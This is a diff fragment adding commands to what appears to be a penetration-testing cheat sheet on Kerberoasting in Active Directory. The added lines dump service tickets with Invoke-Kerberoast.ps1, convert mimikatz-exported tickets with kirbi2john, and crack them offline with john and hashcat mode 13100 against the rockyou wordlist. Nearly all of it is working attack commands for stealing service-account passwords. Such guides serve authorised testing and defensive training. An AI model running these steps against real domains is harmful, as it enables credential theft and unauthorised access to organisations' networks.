@@ -1130,12 +1130,30 @@ kerberos::list
 kerberos::list /export
 ```
 
+Or simply with Invoke-Kerberoast.ps1
+```
+Import Module .\Invoke-Kerberoast.ps1
+Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hash.hash
+```
+
 ### Cracking Service Ticket
 Since the service ticket is encrypted with the service accounts password hash, we can bruteforce this with a wordlist
 This is also possible with john the ripper or hashcat
 ```
 sudo apt update && sudo apt install kerberoast
 python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt ticket.kirbi 
+```
+
+If ticket is obtained with mimikatz ``kerberos::list /export``
+```
+kirbi2john ticket.kirbi > ticket.txt
+john --wordlist=rockyou.txt ticket.txt
+
+```
+
+If Invoke-Kerberoast.ps1 used:
+```
+hashcat -m 13100 --force hash.hash /usr/share/wordlists/rockyou.txt
 ```
 
 
